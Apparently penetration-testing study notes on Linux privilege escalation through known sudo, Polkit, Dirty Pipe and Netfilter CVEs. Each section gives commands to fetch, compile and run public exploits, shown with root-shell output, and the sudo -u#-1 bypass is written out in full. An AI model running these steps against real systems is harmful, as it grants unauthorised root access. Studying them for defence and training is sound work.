# 0-Days Exploits

- Sudo
- Polkit
- Dirty Pipe
- Netfilter

## Sudo

The program sudo is used under UNIX operating systems like Linux or macOS to start processes with the rights of another user. The /etc/sudoers file specifies which users or groups are allowed to run specific programs and with what privileges.
````
$ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'

Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
<user>        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d
````

**CVE-2021-3156**

One of the latest vulnerabilities for sudo carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions:
- 1.8.31 - Ubuntu 20.04
- 1.8.27 - Debian 10
- 1.9.2 - Fedora 33
- and others

To find out the version of sudo, the following command is sufficient:
````
$ sudo -V | head -n1
````
````
$ git clone https://github.com/blasty/CVE-2021-3156.git
$ cd CVE-2021-3156
$ make
$ ./sudo-hax-me-a-sandwich
$ cat /etc/lsb-release
$ ./sudo-hax-me-a-sandwich <target>
````

**Sudo Policy Bypass**

Another vulnerability was found in 2019 that affected all versions below 1.8.28, which allowed privileges to escalate even with a simple command. This vulnerability has the CVE-2019-14287 and requires only a single prerequisite. It had to allow a user in the /etc/sudoers file to execute a specific command.
- < v1.8.28
- Allow a user in the /etc/sudoers file to execute a specific command
````
$ sudo -l
User <user> may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
````
In fact, Sudo also allows commands with specific user IDs to be executed, which executes the command with the user's privileges carrying the specified ID. The ID of the specific user can be read from the /etc/passwd file.
````
$ cat /etc/passwd | grep <user>
<user>:x:1005:1005:<user>,,,:/home/<user>:/bin/bash
````
If a negative ID (-1) is entered at sudo, this results in processing the ID 0, which only the root has. This, therefore, led to the immediate root shell.
````
$ sudo -u#-1 id
root@nix02:/home/<user># id
uid=0(root)
````

## Polkit

PolicyKit (polkit) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so. To check whether the user software is authorized for this instruction, polkit is asked. It is possible to set how permissions are granted by default for each user and application.

Polkit works with two groups of files.

- actions/policies (/usr/share/polkit-1/actions)
- rules (/usr/share/polkit-1/rules.d)

Polkit also has local authority rules which can be used to set or remove additional permissions for users and groups. Custom rules can be placed in the directory /etc/polkit-1/localauthority/50-local.d with the file extension .pkla.

- pkexec - runs a program with the rights of another user or with root rights
- pkaction - can be used to display actions
- pkcheck - this can be used to check if a process is authorized for a specific action

In the pkexec tool, the memory corruption vulnerability with the identifier CVE-2021-4034 was found, also known as Pwnkit and also leads to privilege escalation.

````
$ gcc cve-2021-4034-poc.c -o pwnkit_poc
$ ./pwnkit_poc
# id
uid=0(root) gid=0(root) groups=0(root)
````

## Dirty Pipe

A vulnerability in the Linux kernel, named Dirty Pipe (CVE-2022-0847), allows unauthorized writing to root user files on Linux. Technically, the vulnerability is similar to the Dirty Cow vulnerability discovered in 2016. All kernels from version 5.8 to 5.17 are affected and vulnerable to this vulnerability.

Vulnerable versions: **5.8 - 5.17**

This vulnerability is based on pipes. Pipes are a mechanism of unidirectional communication between processes that are particularly popular on Unix systems. For example, we could edit the /etc/passwd file and remove the password prompt for the root. This would allow us to log in with the su command without the password prompt.

**Verify Kernel Version**
````
$ uname -r
5.13.0-46-generic
````
**Download Dirty Pipe Exploit**
````
$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
$ cd CVE-2022-0847-DirtyPipe-Exploits
$ bash compile.sh
````
**Exploitation**

DirtyPipe 1
````
$ ./dirtypipe1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)
id
uid=0(root) gid=0(root) groups=0(root)

if appears: system() function call seems to have failed :(

$ su root
Password: piped
````
DirtyPipe 2
````
- Find SUID Binaries - 
$ find / -perm -4000 2>/dev/null
$ ./dirtypipe2 /usr/bin/sudo
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# id
uid=0(root) gid=0(root) groups=0(root)
````

## Netfilter

Netfilter is a Linux kernel module that provides, among other things, packet filtering, network address translation, and other tools relevant to firewalls. It controls and regulates network traffic by manipulating individual packets based on their characteristics and rules. Netfilter is also called the software layer in the Linux kernel. When network packets are received and sent, it initiates the execution of other modules such as packet filters. These modules can then intercept and manipulate packets. This includes the programs like iptables and arptables, which serve as action mechanisms of the Netfilter hook system of the IPv4 and IPv6 protocol stack.

This kernel module has three main functions:
- Packet defragmentation
- Connection tracking
- Network address translation (NAT)

(CVE-2021-22555), (CVE-2022-1015), (CVE-2023-32233)

**CVE-2021-22555**

Vulnerable kernel versions: 2.6 - 5.11
````
$ uname -r
5.10.5-051005-generic
````
````
$ wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
$ gcc -m32 -static exploit.c -o exploit
$ ./exploit
root@ubuntu:/home/<user># id
uid=0(root) gid=0(root) groups=0(root)
````

**CVE-2022-25636**

Vulnerable kernel versions: 
- 5.4 - 5.6.10
- 5.11 - 5.15.26

However, we need to be careful with this exploit as it can corrupt the kernel, and a reboot will be required to reaccess the server.
````
$ git clone https://github.com/Bonfee/CVE-2022-25636.git
$ cd CVE-2022-25636
$ make
$ ./exploit
# id
uid=0(root) gid=0(root) groups=0(root)
````

**CVE-2023-32233**

This vulnerability exploits the so called anonymous sets in nf_tables by using the Use-After-Free vulnerability in the Linux Kernel up to version **6.3.1**. These nf_tables are temporary workspaces for processing batch requests and once the processing is done, these anonymous sets are supposed to be cleared out (Use-After-Free) so they cannot be used anymore. Due to a mistake in the code, these anonymous sets are not being handled properly and can still be accessed and modified by the program.
````
$ git clone https://github.com/Liuk3r/CVE-2023-32233
$ cd CVE-2023-32233
$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl
$ ./exploit
# id
uid=0(root) gid=0(root) groups=0(root)
````
